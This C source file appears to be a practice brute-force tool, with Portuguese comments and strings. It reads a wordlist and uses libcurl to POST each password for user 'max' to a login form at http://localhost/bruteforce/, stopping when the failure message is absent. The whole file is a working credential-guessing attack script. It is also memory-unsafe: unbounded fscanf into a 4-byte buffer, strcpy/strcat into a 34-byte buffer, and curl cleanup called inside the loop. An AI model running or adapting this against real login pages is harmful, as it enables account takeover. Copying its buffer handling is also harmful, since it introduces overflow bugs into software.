#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <curl/easy.h>

#define NUM_SENHAS 1726272

struct string {
  char *ptr;
  size_t len;
};

void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}



int main(int argc, char *argv[]){

  int i,j,k,l;
	CURL *curl;
  CURLcode res;
  FILE *ptr;



  ptr = fopen("wordlist1.txt", "r");

  if(!ptr){
    printf("erro ao carregar o wordlist!");
    return -1;
  }

  rewind (ptr);

	printf(" \n\n iniciando o teste com %d senhas... \n\n ", NUM_SENHAS );

  // /* get a curl handle */ 
  curl = curl_easy_init();
  if(curl) {

  //    /* First set the URL that is about to receive our POST. This URL can
  //       just as well be a https:// URL if that is what should receive the
  //       data. */ 
  curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/bruteforce/");

  /* get verbose debug output please */ 
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

  while(! feof(ptr)){
    char senha[4];

    fscanf(ptr, "%s\n", senha );


    //printf("%s \n", senha);

    char header[70] = "txt_usuario=max&txt_senha=";

    char *paramsAtual = (char *) malloc(sizeof(char)*34);

    strcpy( paramsAtual, header );
    strcat( paramsAtual, senha );

    printf("http://localhost/bruteforce/? %s\n", paramsAtual );

  	/* In windows, this will init the winsock stuff */ 
  	// curl_global_init(CURL_GLOBAL_ALL);

  	

    struct string s;
    init_string(&s);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

      	/* Now specify the POST data */ 
    //curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, paramsAtual);


      	/* Perform the request, res will get the return code */ 
    res = curl_easy_perform(curl);
      	/* Check for errors */ 
    if(res != CURLE_OK){
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
               curl_easy_strerror(res));

     		/* always cleanup */ 
     		curl_easy_cleanup(curl);
  	 	}
      else{
        if( strstr(s.ptr, " ou senha" ) == NULL ){
          printf("senha encontrada: %s\n", senha );
          return 0;
        }
        free(s.ptr);
      }

      
  	 	curl_global_cleanup();

   }
  }
   fclose(ptr);


	return 0;
}